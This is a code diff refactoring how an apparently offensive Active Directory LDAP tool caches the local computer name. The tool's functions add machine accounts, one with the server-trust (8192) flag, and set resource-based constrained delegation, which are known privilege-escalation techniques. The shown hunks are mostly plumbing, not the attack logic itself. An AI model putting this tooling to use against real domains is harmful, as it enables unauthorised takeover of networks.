@@ -1,5 +1,7 @@
 #include "m_ldap_api.h"
 #define DEBUG 1
+#define INFO_BUFFER_SIZE 32767
+
 LDAP_API::LDAP_API(string username, string password, string ldapServerAddr, string domainName)
 {
 	this->pLdapInstance = NULL;
@@ -11,9 +13,8 @@ LDAP_API::LDAP_API(string username, string password, string ldapServerAddr, stri
 	this->password = password;
 	this->defaultTimeVal.tv_sec = 1;
 	this->init();
-	this->initBaseDn();
 }
- 
+
 LDAP_API::LDAP_API(string ldapServerAddr, string domainName)
 {
 	this->pLdapInstance = NULL;
@@ -44,6 +45,7 @@ void LDAP_API::closeLdapConnection(){
 
 void LDAP_API::init(){
 	this->initBaseDn();
+	this->initBaseComputerName();
 	this->pLdapInstance = ldap_init((PSTR)this->ldapServerAddr.c_str(), LDAP_PORT);
 	if (this->setLdapOption() == LDAP_SUCCESS){
 		if (this->connect() == LDAP_SUCCESS){
@@ -59,6 +61,17 @@ void LDAP_API::initBaseDn(){
 	this->baseDn = "DC=" + vString[0] + ",DC=" + vString[1];
 }
 
+void LDAP_API::initBaseComputerName(){
+	TCHAR  currentComputerName[INFO_BUFFER_SIZE];
+	DWORD dwComputerSize;
+	dwComputerSize = INFO_BUFFER_SIZE;
+	GetComputerName(currentComputerName, &dwComputerSize);
+	this->baseComputerName = currentComputerName;
+	if (this->baseComputerName.empty()){
+		cout << "[-] init base ComputerName Failed, The Error is " << to_string(GetLastError()) << endl;
+	}else
+		cout << "[-] init base ComputerName Succssed" << endl;
+}
 
 SEC_WINNT_AUTH_IDENTITY_W LDAP_API::initLdapCreds(){
 	SEC_WINNT_AUTH_IDENTITY_W secAuthIdentity;
@@ -307,27 +320,17 @@ vector<string> LDAP_API::getObjectSid(string pcName){
 
 string LDAP_API::getComputerDn(){
 	PCHAR pAttributes[] = { "distinguishedName", NULL };
-
-	TCHAR szBufferComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
-	DWORD dwComputerSize;
-	GetComputerName(szBufferComputerName, &dwComputerSize);
-	
-	string grammarString = "(sAMAccountName=" + string(szBufferComputerName) + "$)";
+	string grammarString = "(sAMAccountName=" + this->baseComputerName + "$)";
 	vector<string> vString = this->search(grammarString.c_str(), this->baseDn, pAttributes);
 	return vString[0];
 }
 
 string LDAP_API::addComputer(string pcName){
-	DWORD dwComputerSize;
-	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
-	GetComputerName(currentComputerName, &dwComputerSize);
-
-	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
-	regex matchString(currentComputerName);
-
+	regex matchString(this->baseComputerName);
 	string computerDnString = this->getComputerDn();
-	cout << "[+] Getting computerDn ----> " << computerDnString << endl;
-	string addComputerDnString = regex_replace(computerDnString, matchString, pcName, fonly);
+	cout << "[+] Getting Current Computer Dn ----> " << computerDnString << endl;
+	string addComputerDnString = regex_replace(computerDnString, matchString, pcName, regex_constants::format_first_only);
+	cout << "[+] Getting New Computer Dn ----> " << addComputerDnString << endl;
 	LDAPMod m1, m2, m3, m4, m5, m6;
 	string dnsHostNameString = pcName + "." + this->domainName;
 	TCHAR* dnsHostNameVals[] = { (TCHAR*)dnsHostNameString.c_str(), NULL };
@@ -392,12 +395,8 @@ string LDAP_API::addComputer(string pcName){
 }
 
 string LDAP_API::addComputerUac8192(string pcName){
-	DWORD dwComputerSize;
-	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
-	GetComputerName(currentComputerName, &dwComputerSize);
-
 	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
-	regex matchString(currentComputerName);
+	regex matchString(this->baseComputerName);
 
 	string computerDnString = this->getComputerDn();
 	cout << "[+] Getting computerDn ----> " << computerDnString << endl;
@@ -505,11 +504,8 @@ void LDAP_API::updateResourceBasedConstrainedDelegation(string pcName){
 	wstring addComputerSidString = string2Wstring(addComputer(pcName));
 	//wstring addComputerSidString = L"S-1-5-21-4223269421-3390898629-3395902804-1132"; // 新添加机器的objectSid
 	
-	DWORD dwComputerSize;
-	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
-	GetComputerName(currentComputerName, &dwComputerSize);
 	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
-	regex matchString(currentComputerName);
+	regex matchString(this->baseComputerName);
 	string computerDnString = this->getComputerDn();
 
 	if (!vCnString.empty()){
